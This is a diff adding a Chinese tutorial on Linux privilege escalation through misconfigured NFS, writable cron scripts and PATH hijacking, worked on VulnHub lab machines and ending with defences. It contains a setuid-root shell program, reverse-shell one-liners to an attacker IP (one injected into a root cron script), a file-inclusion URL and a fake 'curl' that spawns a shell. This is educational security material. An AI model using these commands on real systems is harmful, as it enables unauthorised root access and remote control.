@@ -1,0 +1,269 @@
+## 1. 概述
+
+本文档旨在深入探讨在 Linux 系统中三种常见的权限提升（Privilege Escalation）技术。权限提升是攻击者在获得系统初步访问权限（如 www-data 用户或普通用户）后，试图获取更高权限（如 root 用户）的关键步骤。我们将分别介绍如何利用配置不当的 NFS 服务、可被修改的 Cron 定时任务以及被劫持的 PATH 环境变量来实现提权。
+
+本文档结合了理论原理与详细的实战步骤，提供了可复现的攻击流程和代码示例，旨在为安全研究人员和系统管理员提供一份详尽的技术参考。
+
+---
+
+## 2. NFS 服务漏洞与 SUID 提权
+
+### 2.1. 技术原理
+
+NFS (Network File System) 允许网络中的计算机像访问本地文件一样共享远程服务器上的文件和目录。当 NFS 服务器的共享目录配置不当时，例如将共享目录设置为 `no_root_squash`，客户端就能以 root 身份在挂载的目录中创建文件，并且这些文件在服务器端的所有者也是 root。
+
+如果攻击者能够将一个带有 SUID（Set User ID）权限位的恶意可执行文件写入该共享目录，那么当任何用户在目标系统上执行这个文件时，该进程将以文件所有者（即 root）的权限运行，从而实现权限提升。
+
+### 2.2. 环境准备
+
+- **靶机**: 一台运行 Linux 系统的虚拟机，并开启了配置不当的 NFS 服务。例如，可以使用 VulnHub 上的 `hacksudo: 2` 靶场。
+- **攻击机**: 一台装有 NFS 客户端工具（如 `nmap`, `showmount`, `mount`）和 C 语言编译器（`gcc`）的 Linux 系统。
+- **网络**: 攻击机与靶机处于同一局域网内。
+
+### 2.3. 实战示例
+
+#### 步骤 1: 信息收集
+
+首先，使用 `nmap` 扫描目标主机，确认其开放的服务，特别是 NFS 相关的端口（通常是 2049）。
+
+```bash
+nmap 192.168.110.99
+```
+
+同时，可以尝试通过 Web 漏洞（如文件包含）读取敏感文件，以获取更多系统信息。
+
+```bash
+# 尝试读取 /etc/passwd 文件
+http://192.168.110.99/file.php?file=/etc/passwd
+```
+
+#### 步骤 2: 发现并挂载 NFS 共享
+
+使用 `showmount` 工具查询目标主机上有哪些可用的 NFS 共享目录。
+
+```bash
+showmount -e 192.168.110.99
+# 假设返回结果为 /mnt/nfs *
+```
+
+在攻击机上创建一个本地目录，并将远程 NFS 共享挂载到该目录。
+
+```bash
+mkdir nfs
+mount -t nfs 192.168.110.99:/mnt/nfs ./nfs
+```
+
+#### 步骤 3: 编译并部署 SUID Payload
+
+在攻击机上，编写一个简单的 C 程序，其功能是设置进程的 UID 为 0（root），然后启动一个 shell。
+
+**`getroot.c`**
+```c
+#include <stdlib.h>
+#include <unistd.h>
+
+int main() {
+    setuid(0);
+    system("id");
+    system("/bin/bash");
+    return 0;
+}
+```
+
+编译此程序。**注意**：为了确保兼容性，编译环境的系统架构（如 x86_64）应与目标机一致。
+
+```bash
+gcc getroot.c -o getroot
+```
+
+将编译好的可执行文件复制到之前挂载的 NFS 目录中，并为其添加 SUID 权限位。
+
+```bash
+cp getroot ./nfs/
+chmod +s ./nfs/getroot
+```
+
+#### 步骤 4: 在目标机上执行 Payload
+
+现在，切换到目标机的 shell（可能是一个低权限的 Web Shell 或 SSH 会话），进入共享目录并执行我们准备好的 `getroot` 文件。
+
+```bash
+# 在目标机上操作
+cd /mnt/nfs
+./getroot
+
+# 如果成功，你将看到 id 命令的输出显示 uid=0(root)
+# id
+# uid=0(root) gid=0(root) groups=0(root)
+# whoami
+# root
+```
+
+### 2.4. 关键细节
+
+- **`no_root_squash`**: 这是 NFS 配置中的一个关键选项。默认情况下，NFS 会启用 `root_squash`，将来自客户端 root 用户的请求映射为匿名用户（nfsnobody），以防止安全风险。如果管理员错误地配置了 `no_root_squash`，客户端的 root 用户权限将被保留。
+- **SUID (Set User ID)**: 这是一种特殊的权限位。当一个可执行文件设置了 SUID 位后，任何用户执行它时，该进程的有效用户 ID (EUID) 将变为文件所有者的 ID。如果文件所有者是 root，执行者就能临时获得 root 权限。
+
+---
+
+## 3. Cron 定时任务劫持
+
+### 3.1. 技术原理
+
+Cron 是 Linux 系统中用于周期性执行任务的服务。系统管理员或应用程序可能会配置一些定时任务脚本。如果攻击者获得了对这些脚本文件的写入权限，或者对脚本所在的目录有写入权限，就可以向脚本中注入恶意命令。当 Cron 服务在预定时间以高权限（通常是 root）执行该脚本时，注入的恶意命令也会随之执行，从而实现提权。
+
+### 3.2. 环境准备
+
+- **靶机**: 运行 Linux 系统，并存在一个由高权限用户（如 root）所有但普通用户可写的定时任务脚本。例如，可以使用 VulnHub 上的 `Jarbas: 1` 靶场。
+- **攻击机**: 用于接收反弹 shell 的 Linux 系统。
+- **权限**: 已获得目标机上的一个低权限 shell（例如通过 Web 漏洞）。
+
+### 3.3. 实战示例
+
+#### 步骤 1: 获取初步访问权限
+
+假设已通过 Jenkins 服务的一个漏洞获取了反弹 shell。
+
+```bash
+# 在 Jenkins 任务中配置反弹 shell 命令
+/bin/bash -c 'bash -i >& /dev/tcp/192.168.110.131/4444 0>&1'
+```
+
+#### 步骤 2: 信息收集与发现可写任务
+
+在获得的 shell 中，首先查看系统的定时任务配置文件 `/etc/crontab`，寻找可利用的目标。
+
+```bash
+cat /etc/crontab
+# 假设发现一个每分钟执行一次的脚本
+# * * * * * root /etc/script/CleaningScript.sh
+```
+
+检查该脚本的内容和权限。
+
+```bash
+cat /etc/script/CleaningScript.sh
+ls -la /etc/script/CleaningScript.sh
+# 假设 ls -la 的输出显示当前用户对该文件有写入权限
+# -rwxrwxrwx 1 root root 50 Mar 17 10:00 /etc/script/CleaningScript.sh
+```
+
+#### 步骤 3: 注入恶意命令
+
+由于我们对脚本文件有写入权限，可以使用 `echo` 命令将一个反弹 shell 命令追加到脚本末尾。
+
+```bash
+echo "/bin/bash -i >& /dev/tcp/192.168.110.131/6666 0>&1" >> /etc/script/CleaningScript.sh
+```
+
+#### 步骤 4: 接收 Root Shell
+
+在攻击机上设置监听，等待 Cron 任务执行。
+
+```bash
+nc -lvnp 6666
+```
+
+当定时任务触发时（最多等待一分钟），攻击机将收到一个由 root 用户启动的反弹 shell。
+
+### 3.4. 关键细节
+
+- **权限检查**: 提权成功的关键在于**文件或目录的写入权限**。务必使用 `ls -la` 或 `find` 命令仔细检查目标脚本及其所在目录的权限配置。
+- **任务用户**: 注意 `/etc/crontab` 中指定执行任务的用户。只有当任务由 root 用户执行时，才能通过此方法直接获得 root 权限。
+
+---
+
+## 4. PATH 环境变量劫持
+
+### 4.1. 技术原理
+
+当一个程序（尤其是设置了 SUID 的程序）在执行时调用其他命令（如 `curl`, `find`, `service`），但没有使用这些命令的绝对路径（如 `/bin/curl`），操作系统会根据 `PATH` 环境变量中定义的路径顺序来查找这些命令。
+
+如果攻击者能够控制 `PATH` 环境变量，并将一个包含恶意脚本的目录（如 `/tmp`）添加到 `PATH` 的最前面，那么当 SUID 程序尝试执行一个常用命令时，它会首先在恶意目录中找到攻击者伪造的同名脚本并执行它。由于该程序是以 root 权限运行的，伪造的脚本也将以 root 权限执行。
+
+### 4.2. 环境准备
+
+- **靶机**: 存在一个以 root 权限运行的 SUID 程序，该程序内部调用了未指定绝对路径的系统命令。例如，可以使用 VulnHub 上的 `Symfonos: 1` 靶场。
+- **权限**: 已获得目标机上的一个低权限用户 shell。
+
+### 4.3. 实战示例
+
+#### 步骤 1: 获取初步访问权限
+
+通过各种漏洞（如 SMB 匿名登录、Web 应用漏洞等）获取一个低权限 shell。
+
+```bash
+# 示例：通过 Mail Masta 插件的文件包含漏洞获取 Web Shell
+http://192.168.110.141/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&shell=id
+
+# 升级为交互式 Shell
+python -c 'import pty;pty.spawn("/bin/bash")'
+```
+
+#### 步骤 2: 寻找 SUID 程序并分析
+
+使用 `find` 命令在目标系统上寻找设置了 SUID 权限的程序。
+
+```bash
+find / -perm -u=s -type f 2>/dev/null
+# 假设发现 /opt/statuscheck
+```
+
+使用 `strings` 或逆向工具分析该程序，确定它调用了哪些外部命令。
+
+```bash
+strings /opt/statuscheck
+# 假设输出中包含 "curl -I http://127.0.0.1/index.html"
+# 关键点：这里调用的是 `curl` 而不是 `/usr/bin/curl`
+```
+
+#### 步骤 3: 创建伪造命令并修改 PATH
+
+在一个人人可写的目录（如 `/tmp`）中，创建一个名为 `curl` 的恶意脚本。
+
+```bash
+cd /tmp
+echo "/bin/sh" > curl
+chmod 777 curl
+```
+
+修改当前 shell 的 `PATH` 环境变量，将 `/tmp` 目录添加到最前面。
+
+```bash
+export PATH=/tmp:$PATH
+echo $PATH
+# 确认 /tmp 已在 PATH 的开头
+# /tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+```
+
+#### 步骤 4: 执行 SUID 程序触发提权
+
+现在，执行那个 SUID 程序。
+
+```bash
+/opt/statuscheck
+```
+
+当 `/opt/statuscheck` 尝试执行 `curl` 命令时，它会首先在 `/tmp` 目录中找到我们伪造的 `curl` 脚本。由于 `/opt/statuscheck` 是以 root 权限运行的，我们的 `/tmp/curl`（即 `/bin/sh`）也将以 root 权限执行，从而为我们提供一个 root shell。
+
+### 4.4. 关键细节
+
+- **相对路径调用**: 此漏洞的核心是程序使用了相对路径（如 `curl`）而非绝对路径（如 `/usr/bin/curl`）来调用命令。
+- **环境变量控制**: 攻击者必须能够控制执行 SUID 程序时的 `PATH` 环境变量。在大多数 shell 环境下，`export` 命令即可实现。
+- **SUID 程序行为**: 并非所有 SUID 程序都会保留用户的 `PATH` 变量。一些经过安全加固的程序在执行时会重置为默认的安全路径。
+
+---
+
+## 5. 安全总结与防御措施
+
+- **NFS 安全**:
+  - **防御**: 始终使用 `root_squash` 选项，避免使用 `no_root_squash`。对共享目录进行严格的权限控制，仅授权给必要的客户端 IP。
+  - **检测**: 定期审查 `/etc/exports` 文件，检查是否存在不安全的配置。
+
+- **Cron 任务安全**:
+  - **防御**: 遵循最小权限原则。确保定时任务脚本及其所在目录不被低权限用户写入。对脚本文件设置不可变属性（`chattr +i`）可以增加一层保护。
+  - **检测**: 定期审计系统中的所有 Cron 任务（`/etc/crontab`, `/etc/cron.*`, `/var/spool/cron/*`），检查脚本权限和内容。
+
+- **PATH 环境变量安全**:
+  - **防御**: 开发人员在编写高权限程序（尤其是 SUID 程序）时，必须使用命令的绝对路径。在脚本开头定义一个固定的、安全的 `PATH` 变量。
+  - **检测**: 代码审计是发现此类漏洞的最佳方式。同时，监控系统中 SUID 文件的执行，并检查其运行环境是否异常。
